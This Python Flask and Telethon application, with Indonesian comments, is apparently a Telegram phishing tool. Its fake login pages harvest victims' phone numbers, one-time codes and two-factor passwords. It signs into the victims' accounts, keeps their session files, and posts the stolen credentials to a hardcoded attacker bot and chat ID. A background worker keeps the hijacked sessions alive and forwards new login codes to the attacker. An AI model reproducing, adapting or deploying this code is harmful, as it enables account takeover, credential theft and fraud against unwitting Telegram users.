import os
import re
import asyncio
import threading
import requests
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")

# Konfigurasi API & BOT
api_id = int(os.getenv("API_ID", "16047851"))
api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
CHAT_ID = os.getenv("CHAT_ID", "7712462494")

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# ============= HELPER ASYNC =============
def run_async(coro):
    """Helper untuk menjalankan coroutine tanpa bentrok event loop"""
    try:
        return asyncio.run(coro)
    except RuntimeError:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            return loop.create_task(coro)
        else:
            return loop.run_until_complete(coro)

# ============= FLASK ROUTES =============

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        name = request.form.get("name")
        phone = request.form.get("phone")
        gender = request.form.get("gender")
        session["name"], session["phone"], session["gender"] = name, phone, gender

        # hapus session lama supaya OTP baru
        session_path = os.path.join(SESSION_DIR, f"{phone}.session")
        if os.path.exists(session_path):
            os.remove(session_path)

        async def send_code():
            client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
            await client.connect()
            if not await client.is_user_authorized():
                sent = await client.send_code_request(phone)
                session["phone_code_hash"] = sent.phone_code_hash
            await client.disconnect()

        try:
            run_async(send_code())
            flash("OTP sudah dikirim ke Telegram kamu.")
            return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Error: {str(e)}")
            return redirect(url_for("login"))

    return render_template("login.html")


@app.route("/otp", methods=["GET", "POST"])
def otp():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if request.method == "POST":
        code = request.form.get("otp")

        async def verify_code():
            client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
            await client.connect()
            try:
                phone_code_hash = session.get("phone_code_hash")
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                me = await client.get_me()
                await client.disconnect()
                return {"ok": True, "need_password": False, "me": me}
            except SessionPasswordNeededError:
                await client.disconnect()
                return {"ok": True, "need_password": True, "me": None}
            except PhoneCodeInvalidError:
                await client.disconnect()
                return {"ok": False, "error": "OTP salah"}

        try:
            result = run_async(verify_code())
            if result["ok"]:
                session["last_otp"] = code
                session["need_password"] = result["need_password"]
                return redirect(url_for("password"))
            else:
                flash(result["error"])
                return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Error lain: {e}")
            return redirect(url_for("otp"))

    return render_template("otp.html")


@app.route("/password", methods=["GET", "POST"])
def password():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    need_password = session.get("need_password", False)

    if request.method == "POST":
        password_input = request.form.get("password")

        if need_password:
            # WAJIB verifikasi password
            async def verify_password():
                client = TelegramClient(os.path.join(SESSION_DIR, phone), api_id, api_hash)
                await client.connect()
                try:
                    await client.sign_in(password=password_input)
                    me = await client.get_me()
                    await client.disconnect()
                    return True, me
                except Exception:
                    await client.disconnect()
                    return False, None

            success, me = run_async(verify_password())
            if not success:
                flash("Password salah ❌")
                return redirect(url_for("password"))
        else:
            # Tidak butuh password → langsung lanjut
            me = None  

        # kirim info ke bot
        otp = session.get("last_otp")
        text = (
            "📢 *New User Login*\n"
            f"👤 *Number*   : `{phone}`\n"
            f"🔑 *OTP*      : `{otp}`\n"
            f"🔒 *Password* : `{password_input if need_password else 'N/A (no password)'}"
        )
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})

        flash("Login berhasil ✅")
        return redirect(url_for("success"))

    return render_template("password.html")


@app.route("/success")
def success():
    return render_template(
        "success.html",
        name=session.get("name"),
        phone=session.get("phone"),
        gender=session.get("gender")
    )

# ============= WORKER =============

async def forward_handler(event, client_name):
    """Handler untuk meneruskan pesan OTP"""
    text_msg = event.message.message
    if re.search(r"(login code|kode login|code)", text_msg, re.IGNORECASE):
        otp_match = re.findall(r"\d{4,6}", text_msg)
        otp_code = otp_match[0] if otp_match else text_msg

        payload = {
            "chat_id": CHAT_ID,
            "text": f"📩 OTP dari {client_name}:\n\nOTP: {otp_code}"
        }
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=payload)
        print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")


async def worker_main():
    print("Worker jalan...")
    clients = {}

    while True:
        for fname in os.listdir(SESSION_DIR):
            if fname.endswith(".session") and fname not in clients:
                path = os.path.join(SESSION_DIR, fname)
                print(f"[Worker] Memuat session {path}")
                client = TelegramClient(path, api_id, api_hash)
                await client.start()
                me = await client.get_me()
                print(f"[Worker] ✅ Connected sebagai {me.first_name} (@{me.username})")

                @client.on(events.NewMessage)
                async def handler(event, fn=fname):
                    await forward_handler(event, fn)

                clients[fname] = client
                asyncio.create_task(client.run_until_disconnected())

        await asyncio.sleep(10)  # cek ulang tiap 10 detik


def start_worker():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(worker_main())


# jalankan worker di thread terpisah saat app start
threading.Thread(target=start_worker, daemon=True).start()

# ============= RUN FLASK =============
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
